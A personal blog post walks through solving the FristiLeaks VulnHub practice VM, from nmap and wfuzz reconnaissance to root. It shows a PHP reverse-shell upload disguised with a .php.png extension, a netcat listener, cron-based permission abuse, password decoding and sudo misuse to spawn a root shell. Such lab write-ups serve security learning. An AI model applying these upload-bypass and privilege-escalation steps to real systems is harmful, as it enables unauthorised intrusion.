---
layout: post
title:  "vulnhub fristileaks vm"
date:   2016-05-26 00:00:10 +0000
categories: vulnhub
---
<p>Fun VM and did it on time! <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">Fristileaks</a>
<p>So, the usual stuff:
{% highlight bash %}
sudo netdiscover -r 192.168.0.0/16
{% endhighlight %}
<p> My target is 192.168.1.90 .
{% highlight bash %}
sudo nmap -O -sT 192.168.1.90
{% endhighlight %}
<pre>
Starting Nmap 6.47 ( http://nmap.org ) at 2016-06-01 22:16 WEST
Nmap scan report for 192.168.1.90
Host is up (0.00052s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:A5:A6:76 (Cadmus Computer Systems)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop
</pre>
<p> Found a port 80 open. Opened it in firefox and simple page with a image.
{% highlight bash %}
python wfuzz.py -c -z file,wordlist/general/common.txt --hc 404   http://192.168.1.90/FUZZ
{% endhighlight %}
<p>Only found one dir, "images".
<p>In that dir, there was an image http://192.168.1.90/images/3037440.jpg saying "this is not the url you're looking for" ... so what is the url ? Maybe hidden in the image as metadata?
{% highlight bash %}
exiftool 3037440.jpg
{% endhighlight %}
<p>Nope.
<p>After a while ... a long while, trying to think how to find the correct url i fired nmap and nikto, maybe they could help me.
{% highlight bash %}
sudo nmap -A 192.168.1.90
{% endhighlight %}
<p>Found some Paths! Like /cola /sisi /beer ... nothing really. Neither one was helping showing the same image grrr...
{% highlight bash %}
./nikto.pl -mutate 1 -h 192.168.1.90
./nikto.pl -mutate 1,2,3,4,5,6 -h 192.168.1.90
{% endhighlight %}
<p>A big "nope". After another longgg while it hit me!! "/cola", "/beer" and the "Keep calm and drink fristi"!DUH! So, http://192.168.1.90/fristi/
<p> A login-password form finally and an image! I did a view source and found a comment made by the programmer called eezeepz  and a meta tag. I first pointed at the meta tag saying:
<pre>
super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it."
</pre>
<p>Scrolling down ther was some base64 code commented. Well i tried to insert that code in the image binary and it returned an image saying something like "kekekekekKEKEKEKEK". "what is this?" I thought, "this can't be a password" but i tried it anyway, login: the user in the comment, password the text in the image and...
<p>Login!
<p>Now i could upload a file, the server runs php so i thought of php-reverse-shell upload... error file format not accepted. However, i knew some versions allow something like XXX.php.png and it will run the php code! I renamed it to .png and use the usual suspect for waiting a connection:
{% highlight bash %}
nc -lnvvp 12344
{% endhighlight %}
<p>Firefox pointing to http://192.168.1.90/fristi/uploads/php-reverse-shell.php.png and
<p>SHELL!
{% highlight bash %}
uname -a
{% endhighlight %}
<pre>
Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
</pre>
<p>Walking down the /home got to eezeepz home dir, and it had some notes.txt on it:
<pre>
o EZ,

I made it possible for you to do some automated checks,
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The
output goes to the file "cronresult" in /tmp/. It should
run every minute with my account privileges.

- Jerry
</pre>
<p>But the shell was bothering so:
{% highlight bash %}
python -c 'import pty; pty.spawn("/bin/bash");'
{% endhighlight %}
<p>Ok, i knew i had to use this, but how ? So at my second try doing something useful i tried:
{% highlight bash %}
echo "/home/admin/chmod 777 /home/admin" >runthis
{% endhighlight %}
{% highlight bash %}
cd /home/admin
ls -la
whoisyourgodnow.txt <- fristigod is owner hmm
{% endhighlight %}
<p> Some pass. A encrypt file in python ... should i made a decrypt ?
<p>i did , and got login for admin:
<pre>
import base64,codecs,sys

#def encodeString(str):
#    base64string= base64.b64encode(str)
#    return codecs.encode(base64string[::-1], 'rot13')

#cryptoResult=encodeString(sys.argv[1])
#print cryptoResult

print "----"

def decodeString(str):
   x=codecs.decode(str[::-1],'rot13')
   return base64.b64decode(x)

a=decodeString(sys.argv[1])
print a
</pre>
<p>And password for admin is: thisisalsopw123
<p>Then tried that crypted file owned by fristigod and got another password! :) The password was LetThereBeFristi!
<p>I was feeling very smart at this moment.. i thought that the fristi<b>god</b> would have some useful files on his home... eh, I still needed root! So more exploring, now I was in fristigod home...wtf nothing. not even hidden.
<p> So i searched for files owned by the user:
<pre>
find / -user fristigod  
</pre>
<p> Something hidden in /var ... and a root executable, doCom ? tried to run obviously and:
{% highlight bash %}
Nice try, but wrong user ;)
{% endhighlight %}
<p>ehehe, fristigod can't sudo.. can admin ? noooo. Can i change permission of it like i did for home? i doubt it, but tried it: nah.
<p>After hitting my head for a while i decided to view .bash_history in /var/fristigod
{% highlight bash %}
"nothing"
"nothing"
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
"nothing, wait what ?"
{% endhighlight %}
<p>Big duh! again. I tried and it needed a parameter.NO PROBLEM, take this:
{% highlight bash %}
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/sh
{% endhighlight %}
<p>ROOT!
<p>Now where is my flag!
<pre>
sh-4.1# cd /root
cd /root
sh-4.1# ls
ls
fristileaks_secrets.txt
sh-4.1# cat fristileaks_secrets.txt
cat fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1


sh-4.1#
</pre>
<p>WEEEEEE! Trully fun, no need for exploits just bad configurations! It was my first VM from start to end without advice, so i can say it was special :)
<p>Time to check other people solutions!
